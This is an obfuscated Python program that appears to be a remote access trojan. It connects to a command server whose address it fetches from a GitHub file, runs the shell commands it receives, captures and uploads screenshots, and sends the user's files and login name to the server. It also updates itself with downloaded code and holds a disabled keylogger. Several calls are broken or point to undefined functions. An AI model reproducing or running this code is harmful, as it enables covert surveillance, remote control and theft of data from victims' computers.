import subprocess,socket,time,requests,os,logging
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
VcMywlYRuFReJtHjuharI = ""
eKsPRyrGMeJ = ""
awooUqVCYTwm = "05.12.24.5"
gXpTDFwqyVrHwyNpxxrtGLn = "!"
WpfTZrxAsmvnCkPHC = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
lYGNjyuQBrYpRcEYRnAXlrb = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
LOGGING_PATH = os.path.expanduser("~\\AppData\\Local\\")
def uEXnkjfkfsUDyR(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def ShsQWcYcuQHKms(s):
	bnDJVRB = s.recv(1024)
	if len(bnDJVRB)==0:
		return True
	QDsSkDWvjyrwmRPP = bnDJVRB.decode("utf-8").replace("\n","")
	if not QDsSkDWvjyrwmRPP.startswith(gXpTDFwqyVrHwyNpxxrtGLn):
		proc = subprocess.run(QDsSkDWvjyrwmRPP, shell=True, capture_output=True)
		RMeFIVV = proc.stdout + proc.stderr
		s.send(RMeFIVV)
		return
	qJwUjBleOFswwiw = QDsSkDWvjyrwmRPP.split(" ")[0][1:]
	if qJwUjBleOFswwiw == "download":
		otdurrdyidNeJWEatHzSXnz(s, QDsSkDWvjyrwmRPP)
	elif qJwUjBleOFswwiw == "screenshot":
		LPtHQDwhVxqIzgitc(s)
	elif qJwUjBleOFswwiw == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif qJwUjBleOFswwiw == "update":
		manualUpdate(s)
def otdurrdyidNeJWEatHzSXnz(s, QDsSkDWvjyrwmRPP):
	VVLshdWNRYKWgOeF = QDsSkDWvjyrwmRPP.replace(gXpTDFwqyVrHwyNpxxrtGLn+"download ","").split(",")
	RMeFIVVs = ""
	for f in VVLshdWNRYKWgOeF:
		RMeFIVVs += UyVSQOxjUrrd(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(RMeFIVVs, "utf-8"))
def LPtHQDwhVxqIzgitc(s):
	qnEDpsKBIuJDfGTcvSgu = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	dDpUmOSXbvgIQes = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	qnEDpsKBIuJDfGTcvSgu.save(dDpUmOSXbvgIQes)
	qnEDpsKBIuJDfGTcvSgu.close()
	r = UyVSQOxjUrrd(dDpUmOSXbvgIQes, "api/sscap")
	os.remove(dDpUmOSXbvgIQes)
	s.send(bytes(r,"utf-8"))
def UyVSQOxjUrrd(LflFHifwBegbdcZwOoSZOGY, TfFbhqI, NaOiJSLclyEwYLRQHmKlu=None):
	if not os.path.isfile(LflFHifwBegbdcZwOoSZOGY):
		return "[!] 404: "+LflFHifwBegbdcZwOoSZOGY+"\n"
	headers = {"user":os.getlogin()}
	if NaOiJSLclyEwYLRQHmKlu is not None:
		headers = {**headers, **NaOiJSLclyEwYLRQHmKlu}
	requests.post("http://"+VcMywlYRuFReJtHjuharI+":5555/"+TfFbhqI,
		files={"file":open(LflFHifwBegbdcZwOoSZOGY, "rb")},
		headers=headers)
	return "[+] 200: "+LflFHifwBegbdcZwOoSZOGY+"\n"
def manualUpdate(s):
	h, p, v = getStartupInfo(True)
	if (v != awooUqVCYTwm):
		update(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def update(ripUQFxvFPlGry):
	ZDfGBUkdUGQESJoGLUN = os.path.basename(__file__)
	fileType = ZDfGBUkdUGQESJoGLUN.split(".")[-1]
	lbyKNXdYoqwYM = ZDfGBUkdUGQESJoGLUN.split(".")[0]+"."+ripUQFxvFPlGry+".pyw" if fileType.startsWith("py") else ".exe"
	GFZSRPTxPcLxZ = os.path.join(os.getcwd(), lbyKNXdYoqwYM)
	if not os.path.isfile(GFZSRPTxPcLxZ):
		with open(lbyKNXdYoqwYM, "w+") as f:
			f.write(requests.get(lYGNjyuQBrYpRcEYRnAXlrb+"file."+ "pyw" if GFZSRPTxPcLxZ.split(".")[-1].startswith("py") else "exe").text)
def getStartupInfo(force=False):
	global VcMywlYRuFReJtHjuharI, eKsPRyrGMeJ
	if force or VcMywlYRuFReJtHjuharI == "" or eKsPRyrGMeJ == "":
		bnDJVRB = requests.get(WpfTZrxAsmvnCkPHC).text.replace("\n","").split(":")
		VcMywlYRuFReJtHjuharI = bnDJVRB[0].strip()
		eKsPRyrGMeJ = bnDJVRB[1].strip()
		ripUQFxvFPlGry = bnDJVRB[2].strip()
	return VcMywlYRuFReJtHjuharI, eKsPRyrGMeJ, ripUQFxvFPlGry
def MLmGncUHzPtcBzA():
	pass
def checkKeyLogs():
	logFileName = "settings.xpb"
	logFiles = sorted([file for file in os.path.listdir(LOGGING_PATH) if os.path.isfile(LOGGING_PATH+"\\"+file) and file.endswith(logFileName.split(".")[-1])])
	if logFileName in logFiles:
		logFiles.remove(logFileName)
	logFileFullPath = os.path.join(LOGGING_PATH,logFileName)
	if len(logFiles) > 0:
		with open(logFileFullPath, "ab+") as f:
			for file in logFiles:
				temp = LOGGING_PATH+"\\"+file
				with open(temp,"rb") as tf:
					f.write(tf.read())
				os.remove(temp)
	UyVSQOxjUrrd(logFileFullPath, "api/log")
	if os.path.isfile(logFileFullPath):
		os.remove(logFileFullPath)
def guKdyAUCCMIjDxxzaCMJxj():
	h, p, v = xmCQePIMldxMTTpqTFWSGYe()
	#checkKeyLogs()
	MLmGncUHzPtcBzA()
	if awooUqVCYTwm != v:
		update(v)
	KBlcgMuqSmAbTcIPojXfA = bytes("["+awooUqVCYTwm+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				vvPQPGWgzabpFNKlXdnzW=False
				try:
					s=uEXnkjfkfsUDyR(h, p)
					while not vvPQPGWgzabpFNKlXdnzW:
						s.send(KBlcgMuqSmAbTcIPojXfA)
						vvPQPGWgzabpFNKlXdnzW=ShsQWcYcuQHKms(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
# start this in new thread as it's blocking main thread
#logging.basicConfig(filename=(LOGGING_PATH+str(datetime.today().strftime("%d")) + ".xpb"), level=logging.DEBUG, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
#def logKey(k):
#	logging.info(str(k))
#with Listener(on_press=logKey) as f:
#	f.join()
guKdyAUCCMIjDxxzaCMJxj()
